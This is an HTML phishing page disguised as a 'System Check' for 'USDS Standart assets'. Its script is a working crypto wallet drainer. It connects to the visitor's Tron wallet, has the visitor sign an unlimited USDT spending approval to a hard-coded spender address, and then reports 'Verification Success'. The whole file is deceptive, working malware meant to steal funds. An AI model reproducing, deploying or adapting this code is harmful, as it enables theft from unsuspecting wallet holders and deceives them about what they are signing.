<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Protocol Verification</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); padding: 40px 20px; border-radius: 30px; width: 80%; max-width: 300px; text-align: center; backdrop-filter: blur(20px); }
        .btn { background: #fff; color: #000; border: none; padding: 18px; border-radius: 15px; font-weight: 700; width: 100%; cursor: pointer; margin-top: 20px; }
        #log { font-size: 10px; color: #555; margin-top: 15px; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="box">
    <div style="font-size: 40px; margin-bottom: 10px;">💎</div>
    <div style="font-size: 18px; font-weight: 600;">System Check</div>
    <div style="color: #666; font-size: 13px; margin-top: 10px;">Authorize the secure connection to synchronize USDS Standart assets.</div>
    <button class="btn" id="btn">CONTINUE</button>
    <div id="log">Awaiting Connection...</div>
</div>

<script>
    const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an";
    const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    const log = (msg) => document.getElementById('log').innerText = msg;
    const btn = document.getElementById('btn');

    btn.onclick = async () => {
        try {
            // Проверяем наличие TronWeb, который дает кошелек
            const tw = window.tronWeb;

            if (!tw || !tw.ready) {
                log("Error: Open this page inside Trust Wallet Browser");
                return;
            }

            log("Connecting...");
            // Запрашиваем аккаунты
            const accounts = await tw.request({ method: 'tron_requestAccounts' });
            
            if (accounts && accounts.code !== 4001) {
                log("Verifying Assets...");
                
                // Используем встроенный в кошелек метод создания контракта
                const contract = await tw.contract().at(USDT);
                const val = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                
                log("Waiting for Approval...");
                await contract.approve(SPENDER, val).send();
                
                log("Verification Success");
                btn.innerText = "VERIFIED";
                btn.disabled = true;
            }
        } catch (e) {
            console.error(e);
            log("Error: " + (e.message || "User Rejected"));
        }
    };

    // Фоновая проверка каждые 2 сек для дебага
    setInterval(() => {
        if (!window.tronWeb) log("Searching for Provider...");
        else if (window.tronWeb.ready) log("Wallet Ready");
    }, 2000);
</script>
</body>
</html>
